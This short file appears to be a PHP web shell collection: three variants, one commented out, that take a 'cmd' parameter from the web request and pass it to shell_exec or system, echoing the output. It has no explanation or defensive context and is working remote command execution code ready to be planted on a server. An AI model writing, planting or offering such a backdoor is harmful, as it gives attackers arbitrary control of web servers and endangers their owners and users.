
//<?php
// $cmd=$_GET['cmd'];
//system($cmd);
<?php echo shell_exec($_GET['cmd']); ?>
<?php
if(isset($_REQUEST['cmd'])){
	echo "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}
?>
